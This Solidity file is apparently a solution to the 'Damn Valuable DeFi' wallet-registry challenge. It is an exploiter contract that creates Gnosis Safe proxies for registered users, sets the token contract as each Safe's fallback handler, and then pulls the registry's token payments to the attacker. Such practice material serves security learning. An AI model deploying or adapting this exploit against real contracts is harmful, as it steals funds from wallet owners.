// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./WalletRegistry.sol";

interface GnosisSafeInterface {
    function transfer(address, uint256) external;
}

interface GnosisSafeProxyFactoryInterface {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (GnosisSafeInterface);
}

contract WalletRegistryExploiter {
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    address immutable owner;
    DamnValuableToken immutable token;
    address masterCopy;
    GnosisSafeProxyFactoryInterface safeFactory;
    WalletRegistry registry;

    receive() external payable {}

    constructor(address tokenAddress, address masterCopyAddress, address payable safeFactoryAddress, address registryAddress) {
        owner = msg.sender;
        token = DamnValuableToken(tokenAddress);
        masterCopy = masterCopyAddress;
        safeFactory = GnosisSafeProxyFactoryInterface(safeFactoryAddress);
        registry = WalletRegistry(registryAddress);
    }

    function exploit(address[] calldata users) external {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            // Exploit the fallback handler of the user's Safe proxy by
            // Trigger the Safe to proxy the call to token contract and execute `transfer`
            GnosisSafeInterface safe = safeFactory.createProxyWithCallback(
                masterCopy,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    owners,
                    1,  // threshold
                    address(0),  // to; ignore
                    bytes(""),  // data; ignore
                    address(token),  // fallbackHandler
                    address(0),  // payment token; ignore
                    0,  // payment amount; ignore
                    address(0)  // payment receiver; ignore
                ),
                i,  // nonce
                address(registry)  // callback address
            );

            safe.transfer(owner, TOKEN_PAYMENT);
        }
    }
}